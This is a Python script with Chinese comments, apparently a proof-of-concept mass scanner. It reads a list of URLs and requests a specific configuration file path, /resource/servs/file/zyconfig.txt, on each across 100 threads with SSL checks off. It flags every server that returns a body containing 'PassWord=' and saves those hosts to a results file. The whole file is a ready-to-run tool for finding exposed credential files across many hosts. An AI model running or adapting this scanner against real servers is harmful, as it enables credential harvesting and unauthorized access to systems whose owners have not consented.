import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import sys
import os

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VulnScanner:
    def __init__(self, threads=100):
        self.threads = threads
        self.vulnerable_urls = []
        self.lock = threading.Lock()
        
    def load_urls(self, filename):
        """从文件加载URL列表"""
        urls = []
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    url = line.strip()
                    if url and not url.startswith('#'):
                        # 确保URL以http开头
                        if not url.startswith(('http://', 'https://')):
                            url = 'http://' + url
                        urls.append(url)
            return urls
        except FileNotFoundError:
            print(f"错误: 文件 {filename} 不存在")
            return []
        except Exception as e:
            print(f"读取文件时出错: {e}")
            return []
    
    def check_vulnerability(self, url):
        """检查单个URL的漏洞"""
        try:
            # 构建完整的请求路径
            target_url = url.rstrip('/') + '/resource/servs/file/zyconfig.txt'
            
            # 设置请求头
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.419.30 Safari/537.36'
            }
            
            # 发送GET请求
            response = requests.get(
                target_url,
                headers=headers,
                timeout=10,
                verify=False,  # 禁用SSL验证
                allow_redirects=False  # 不跟随重定向
            )
            
            # 检查匹配条件
            if response.status_code == 200 and 'PassWord=' in response.text:
                return True, url, response
            else:
                return False, url, response
                
        except requests.exceptions.RequestException as e:
            return False, url, str(e)
        except Exception as e:
            return False, url, str(e)
    
    def scan_url(self, url):
        """扫描单个URL并记录结果"""
        try:
            is_vulnerable, target, result = self.check_vulnerability(url)
            
            with self.lock:
                if is_vulnerable:
                    print(f"[+] 存在漏洞: {target}")
                    self.vulnerable_urls.append(target)
                else:
                    print(f"[-] 安全: {target}")
                        
        except Exception as e:
            with self.lock:
                print(f"[!] 扫描错误 {url}: {e}")
    
    def save_vulnerable_urls(self):
        """保存存在漏洞的URL到result.txt"""
        if not self.vulnerable_urls:
            print("[-] 没有发现存在漏洞的URL，不生成结果文件")
            return
        
        try:
            with open('result.txt', 'w', encoding='utf-8') as f:
                for url in self.vulnerable_urls:
                    f.write(url + '\n')
            print(f"[+] 发现 {len(self.vulnerable_urls)} 个存在漏洞的URL，已保存到 result.txt")
        except Exception as e:
            print(f"[!] 保存结果文件时出错: {e}")
    
    def run_scan(self, filename):
        """运行扫描"""
        print(f"[*] 开始加载URL列表...")
        urls = self.load_urls(filename)
        
        if not urls:
            print("[-] 没有找到可用的URL")
            return
        
        print(f"[*] 共加载 {len(urls)} 个URL")
        print(f"[*] 开始并发扫描 (线程数: {self.threads})...")
        print("-" * 50)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # 提交所有任务
            futures = {executor.submit(self.scan_url, url): url for url in urls}
            
            # 等待所有任务完成
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    url = futures[future]
                    print(f"[!] 任务异常 {url}: {e}")
        
        print("-" * 50)
        self.save_vulnerable_urls()

def main():
    """主函数"""
    print("""
    POC漏洞扫描器
    POC配置:
      - 路径: /resource/servs/file/zyconfig.txt
      - 匹配条件: 状态码200且响应体包含'PassWord='
      - 线程数: 100
    """)
    
    # 检查文件是否存在
    if not os.path.exists('url.txt'):
        print("[-] 错误: url.txt 文件不存在")
        print("[*] 请创建 url.txt 文件并每行放置一个URL")
        sys.exit(1)
    
    # 创建扫描器并运行
    scanner = VulnScanner(threads=100)
    scanner.run_scan('url.txt')

if __name__ == "__main__":
    main()